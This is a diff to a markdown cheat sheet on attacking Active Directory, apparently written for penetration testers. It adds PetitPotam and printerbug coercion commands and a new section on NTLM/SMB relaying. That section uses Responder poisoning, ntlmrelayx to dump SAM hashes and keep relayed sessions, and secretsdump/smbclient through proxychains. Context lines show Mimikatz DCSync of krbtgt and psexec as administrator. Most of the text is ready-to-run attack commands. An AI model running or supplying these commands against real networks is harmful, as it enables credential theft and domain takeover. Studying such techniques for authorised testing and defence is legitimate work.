@@ -18,9 +18,12 @@
   * [Unconstrained Delegation](#Unconstrained-delegation) 
     * [Printer Bug](#Printer-bug) 
   * [Constrained Delegation](#Constrained-delegation) 
-  * [Resource based Constrained Delegation](Resource-based-Constrained-Delegation)
+  * [Resource Based Constrained Delegation](Resource-Based-Constrained-Delegation)
+    * [Webclient Attack](#Webclient-Attack)
     * [Computer object takeover](#Computer-object-Takeover) 
-    * [Image Change Privilege Escalation](#Image-change-Privilege-Escalation) 
+    * [Image Change Privilege Escalation](#Image-change-Privilege-Escalation)
+* [Relaying attacks](#Relaying-attacks)
+  * [SMB Relaying](#SMB-Relaying) 
 * [MS Exchange](#MS-Exchange) 
   * [Attacking externally](#Attacking-externally)
   * [Attacking from the inside](#Attacking-from-the-inside)
@@ -510,7 +513,7 @@ Invoke-Mimikatz -Command '"Kerberos::ptt <KIRBI FILE>"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
-### Resource based Constrained Delegation
+### Resource Based Constrained Delegation
 - Need two privileges:
   - One, control over an object which has SPN configured 
     - (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)
@@ -679,8 +682,11 @@ sudo ntlmrelayx.py -t ldaps://<DC IP> --http-port 8080 --delegate-access
 
 #### Trigger target to authenticate to attacker machine
 - Use hostname we created in the DNS record
+- https://github.com/topotam/PetitPotam
+- - https://github.com/dirkjanm/krbrelayx
 ```
 python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@8080/a <TARGET>
+python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
 ```
 
 #### Check for user to impersonate
@@ -759,6 +765,55 @@ change-lockscreen --webdav \\webdav@80\
 getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
 Export KRB5CCNAME=administrator.ccache
 Psexec.py -k -no-pass <TARGET FQDN>
+```
+
+## Relaying attacks
+- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
+#### Check if LLMNR and NBT-NS is used
+- Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
+- Use ```-A``` for analyze mode.
+```
+Responder -I eth0 -A
+```
+
+### SMB Relaying
+#### Check for SMB hosts without SMB signing
+```
+crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
+```
+
+#### Poison Requests
+```
+Responder -I eth0
+```
+
+#### Relay requests SMB and dump SAM
+- we have to modify the Responder.conf file and disable the HTTP and SMB servers (as NTLM relay will be our SMB and HTTP server).
+- the ```-d``` flag has now been changed from “Enable answers for NETBIOS domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False” to “Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False”. It should also be noted that ```-d``` as it is now CAN have an impact on your client’s network, as you are effectively poisoning the WPAD file over DHCP, which does not always revert back immediately once you stop the attack. It will likely require a reboot.
+```
+Responder -I eth0
+ntlmrelayx.py -tf smb_hosts_nosigning.txt 
+```
+
+#### Relay requests SMB and keep SMB sessions open
+- Use the ```socks``` option to be able to use the ```socks``` command to get a nice overview of the relayed attempts. It will also keep the SMB connection open indefinitely. 
+
+```
+Responder -I eth0
+ntlmrelayx.py -tf smb_hosts_nosigning.txt --socks
+
+# Get overview of all relay attempts
+ntlmrelayx> socks
+
+# Change socks proxy
+sudo vim /etc/proxychains4.conf
+socks4 127.0.0.1 1080
+
+# Use proxychains and it will ignore the password value and use the relay credential instead
+proxychains python3 secretsdump.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
+
+# Also possible to access shares on the network, for example if user is not local admin
+proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
 ```
 
 ## MS Exchange
